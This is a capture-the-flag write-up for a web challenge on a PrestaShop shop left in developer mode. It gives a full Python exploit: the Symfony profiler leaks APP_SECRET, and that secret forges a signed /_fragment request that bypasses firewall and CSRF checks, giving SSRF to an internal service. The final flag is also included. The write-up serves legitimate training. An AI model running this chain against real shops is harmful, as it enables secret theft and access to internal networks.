---
title: "Anime Shop"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
icon: "🛍️"
draft: false
summary: "PrestaShop deployed straight from its GitHub source tree left dev mode on, exposing the Symfony profiler for an APP_SECRET leak and a signed /_fragment SSRF that reads the flag off an internal-only service."
---

## Summary
The shop was PrestaShop 9.1.4 deployed from the GitHub *source* tree instead of a packaged release, so `_PS_MODE_DEV_` was left `true`. That gave an unauthenticated Symfony Web Profiler (arbitrary file read → `APP_SECRET`), which I used to forge a signed `/_fragment` request and turn it into an unauthenticated SSRF that reflected the flag from an internal-only HTTP service.

## Solution
This one was a chain, so my job was mostly direction and verification while the model ground through the PrestaShop/Symfony internals.

1. **Set the direction from the theme.** The hint "quit *VCS* to open a shop" plus a Dockerfile that pulls the GitHub source archive told me this was a *deployed-from-source-leaves-dev-mode-on* bug. I had the model confirm `_PS_MODE_DEV_ = true` and check what dev mode unlocks: the unauthenticated profiler (the admin firewall explicitly excludes `^/(_(profiler|wdt)…`), verbose exception pages, and the `/_fragment` endpoint. It first wandered toward the customer report bot as an XSS path; I pushed back because the internal flag service sends no CORS headers, so a browser on the `app` origin can't read it cross-origin — the read had to be server-side. That pivot was the whole game.

2. **Leak the secret, then have the model build the fragment.** I pointed it at the profiler's `open` action to read `app/config/parameters.php` and pull out `APP_SECRET`. Then I asked it to assemble a `/_fragment` request signed with that secret, steering it onto the two PrestaShop bypasses I knew it would need: `_anonymous_controller=1` (the firewall's `==` is a loose comparison, so `"1" == true`) and `_route=_x` (the CSRF listener bails when the route name starts with `_`). The gadget is `Tools::file_get_contents` against the internal URL — it returns a *string*, so dev mode throws `ControllerDoesNotReturnResponseException` and embeds the returned value (the flag) in the error page.

3. **Catch the signing gotcha and verify.** The model's first signatures `500`'d. I recognized the cause: the origin sits behind Cloudflare with no trusted proxies, so it sees plain `http://` and `UriSigner` must sign over `http://HOST...`, not `https://`. After reusing a `cf_clearance` cookie with the matching Firefox UA, the request returned the flag and I confirmed the format.

```python
#!/usr/bin/env python3
import hashlib, hmac, base64, urllib.request, urllib.error, urllib.parse as up, re

HOST   = 'animeshop.v1t.site'
SECRET = 'vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH'  # from profiler open
CF     = '<cf_clearance from a real browser>'
UA     = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
PATH   = '/admin-dev/_fragment'

infos = {
    '_controller': 'Tools::file_get_contents',
    'url': 'http://internal:5000/admin',
    '_anonymous_controller': '1',   # bypass firewall (loose ==)
    '_route': '_x',                 # skip TokenizedUrlsListener CSRF
}
qs = '?_path=' + up.quote_plus(up.urlencode(infos))

# origin sees http:// (no trusted proxies), so sign over http://HOST
sign_base = f'http://{HOST}{PATH}{qs}'
h = base64.b64encode(hmac.new(SECRET.encode(), sign_base.encode(), hashlib.sha256).digest())
url = f'https://{HOST}{PATH}{qs}&_hash=' + up.quote(h).replace('/', '%2F')

req = urllib.request.Request(url, headers={'User-Agent': UA, 'Cookie': f'cf_clearance={CF}'})
try:
    body = urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace')
except urllib.error.HTTPError as e:
    body = e.read().decode('utf-8', 'replace')

m = re.search(r'it returned a string \(&quot;(.*?)&quot;\)', body)
print('FLAG:', m.group(1) if m else 'not found')
```

```
$ python3 solve.py
FLAG: v1t{twinky_winky_tini_tiny_duck}
```

## Flag
```
v1t{twinky_winky_tini_tiny_duck}
```
